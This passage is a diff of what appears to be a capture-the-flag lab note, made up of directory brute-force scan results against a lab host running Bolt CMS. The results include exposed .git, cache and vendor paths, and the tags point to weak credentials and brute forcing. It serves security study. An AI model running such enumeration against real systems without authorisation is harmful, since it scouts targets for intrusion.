-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/view/css/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/e2 => http://10.10.10.159/bolt/app/cache/profiler/e2/
-200      GET       62l      177w     1757c http://10.10.10.159/bolt/vendor/bin/composer
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/fd => http://10.10.10.159/bolt/app/cache/profiler/fd/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/ff => http://10.10.10.159/bolt/app/cache/profiler/ff/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/vendor/imagine => http://10.10.10.159/bolt/vendor/imagine/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/vendor/imagine/.htpasswd
-403      GET        7l       11w      178c http://10.10.10.159/bolt/vendor/imagine/.htaccess
-301      GET        7l       13w      194c http://10.10.10.159/bolt/vendor/composer/composer => http://10.10.10.159/bolt/vendor/composer/composer/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/vendor/composer/composer/.htaccess
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/view/fonts => http://10.10.10.159/bolt/app/view/fonts/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/view/fonts/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/view/fonts/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/src/js => http://10.10.10.159/bolt/app/src/js/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/src/js/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/src/js/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/vendor/league => http://10.10.10.159/bolt/vendor/league/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/.git/refs/remotes => http://10.10.10.159/bolt/.git/refs/remotes/
-200      GET       19l      168w     1068c http://10.10.10.159/bolt/vendor/composer/composer/LICENSE
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/refs/remotes/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/refs/remotes/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/src/lib => http://10.10.10.159/bolt/app/src/lib/
-```
-```
-301      GET        7l       13w      194c http://10.10.10.159/bolt/files => http://10.10.10.159/bolt/files/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/tests => http://10.10.10.159/bolt/tests/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src => http://10.10.10.159/bolt/src/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/tests/scripts => http://10.10.10.159/bolt/tests/scripts/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app => http://10.10.10.159/bolt/app/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/resources => http://10.10.10.159/bolt/app/resources/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/view => http://10.10.10.159/bolt/app/view/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/theme => http://10.10.10.159/bolt/theme/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/view/img => http://10.10.10.159/bolt/app/view/img/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/vendor => http://10.10.10.159/bolt/vendor/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Security => http://10.10.10.159/bolt/src/Security/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/extensions => http://10.10.10.159/bolt/extensions/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/src => http://10.10.10.159/bolt/app/src/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/view/css => http://10.10.10.159/bolt/app/view/css/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/database => http://10.10.10.159/bolt/app/database/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/vendor/bin => http://10.10.10.159/bolt/vendor/bin/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/view/toolbar => http://10.10.10.159/bolt/app/view/toolbar/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Events => http://10.10.10.159/bolt/src/Events/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/view/img/lib => http://10.10.10.159/bolt/app/view/img/lib/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache => http://10.10.10.159/bolt/app/cache/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/view/js => http://10.10.10.159/bolt/app/view/js/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/config => http://10.10.10.159/bolt/app/config/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/src/lib => http://10.10.10.159/bolt/app/src/lib/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/trans => http://10.10.10.159/bolt/app/cache/trans/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/src/js => http://10.10.10.159/bolt/app/src/js/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/development => http://10.10.10.159/bolt/app/cache/development/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/src/js/modules => http://10.10.10.159/bolt/app/src/js/modules/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/development/data => http://10.10.10.159/bolt/app/cache/development/data/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/view/fonts => http://10.10.10.159/bolt/app/view/fonts/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/config/extensions => http://10.10.10.159/bolt/app/config/extensions/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Storage => http://10.10.10.159/bolt/src/Storage/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/src/js/widgets => http://10.10.10.159/bolt/app/src/js/widgets/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Form => http://10.10.10.159/bolt/src/Form/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/view/js/locale => http://10.10.10.159/bolt/app/view/js/locale/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Security/Random => http://10.10.10.159/bolt/src/Security/Random/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Storage/Database => http://10.10.10.159/bolt/src/Storage/Database/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Translation => http://10.10.10.159/bolt/src/Translation/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/vendor/league => http://10.10.10.159/bolt/vendor/league/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/vendor/facebook => http://10.10.10.159/bolt/vendor/facebook/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/vendor/composer => http://10.10.10.159/bolt/vendor/composer/
-200      GET       62l      177w     1757c http://10.10.10.159/bolt/vendor/bin/composer
-301      GET        7l       13w      194c http://10.10.10.159/bolt/vendor/embed => http://10.10.10.159/bolt/vendor/embed/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Controller => http://10.10.10.159/bolt/src/Controller/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Storage/Repository => http://10.10.10.159/bolt/src/Storage/Repository/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler => http://10.10.10.159/bolt/app/cache/profiler/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/12 => http://10.10.10.159/bolt/app/cache/profiler/12/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/11 => http://10.10.10.159/bolt/app/cache/profiler/11/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/15 => http://10.10.10.159/bolt/app/cache/profiler/15/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/22 => http://10.10.10.159/bolt/app/cache/profiler/22/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/01 => http://10.10.10.159/bolt/app/cache/profiler/01/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/08 => http://10.10.10.159/bolt/app/cache/profiler/08/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/de => http://10.10.10.159/bolt/app/cache/profiler/de/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/39 => http://10.10.10.159/bolt/app/cache/profiler/39/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/45 => http://10.10.10.159/bolt/app/cache/profiler/45/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/vendor/imagine => http://10.10.10.159/bolt/vendor/imagine/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/52 => http://10.10.10.159/bolt/app/cache/profiler/52/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/66 => http://10.10.10.159/bolt/app/cache/profiler/66/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/65 => http://10.10.10.159/bolt/app/cache/profiler/65/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/89 => http://10.10.10.159/bolt/app/cache/profiler/89/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/67 => http://10.10.10.159/bolt/app/cache/profiler/67/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/87 => http://10.10.10.159/bolt/app/cache/profiler/87/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/77 => http://10.10.10.159/bolt/app/cache/profiler/77/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/91 => http://10.10.10.159/bolt/app/cache/profiler/91/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/90 => http://10.10.10.159/bolt/app/cache/profiler/90/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/75 => http://10.10.10.159/bolt/app/cache/profiler/75/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/79 => http://10.10.10.159/bolt/app/cache/profiler/79/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/86 => http://10.10.10.159/bolt/app/cache/profiler/86/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/ca => http://10.10.10.159/bolt/app/cache/profiler/ca/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/82 => http://10.10.10.159/bolt/app/cache/profiler/82/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/98 => http://10.10.10.159/bolt/app/cache/profiler/98/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/74 => http://10.10.10.159/bolt/app/cache/profiler/74/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/95 => http://10.10.10.159/bolt/app/cache/profiler/95/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/cc => http://10.10.10.159/bolt/app/cache/profiler/cc/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Menu => http://10.10.10.159/bolt/src/Menu/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/cd => http://10.10.10.159/bolt/app/cache/profiler/cd/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/bc => http://10.10.10.159/bolt/app/cache/profiler/bc/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/c2 => http://10.10.10.159/bolt/app/cache/profiler/c2/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Request => http://10.10.10.159/bolt/src/Request/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/cf => http://10.10.10.159/bolt/app/cache/profiler/cf/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/c3 => http://10.10.10.159/bolt/app/cache/profiler/c3/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/b7 => http://10.10.10.159/bolt/app/cache/profiler/b7/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/d4 => http://10.10.10.159/bolt/app/cache/profiler/d4/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/f5 => http://10.10.10.159/bolt/app/cache/profiler/f5/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/2c => http://10.10.10.159/bolt/app/cache/profiler/2c/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Storage/Mapping => http://10.10.10.159/bolt/src/Storage/Mapping/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Logger => http://10.10.10.159/bolt/src/Logger/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/7d => http://10.10.10.159/bolt/app/cache/profiler/7d/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/9a => http://10.10.10.159/bolt/app/cache/profiler/9a/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/1f => http://10.10.10.159/bolt/app/cache/profiler/1f/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/4d => http://10.10.10.159/bolt/app/cache/profiler/4d/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/6d => http://10.10.10.159/bolt/app/cache/profiler/6d/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Response => http://10.10.10.159/bolt/src/Response/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Legacy => http://10.10.10.159/bolt/src/Legacy/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Storage/Field => http://10.10.10.159/bolt/src/Storage/Field/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/7e => http://10.10.10.159/bolt/app/cache/profiler/7e/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Extension => http://10.10.10.159/bolt/src/Extension/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Storage/Field/Collection => http://10.10.10.159/bolt/src/Storage/Field/Collection/
 
-```
 
-* The root  
-```
-403      GET        7l       11w      178c http://10.10.10.159/.bash_history
-403      GET        7l       11w      178c http://10.10.10.159/.htpasswd
-403      GET        7l       11w      178c http://10.10.10.159/.htaccess
-301      GET        7l       13w      194c http://10.10.10.159/install => http://10.10.10.159/install/
-403      GET        7l       11w      178c http://10.10.10.159/install/.htpasswd
-403      GET        7l       11w      178c http://10.10.10.159/install/.htaccess
-```
 
-<!-- @nested-tags:EXAMPLE/OF/NESTED/TAGS-->
+<!-- @nested-tags:weak_creds/machines/Registry,brute_force/machines/Registry-->
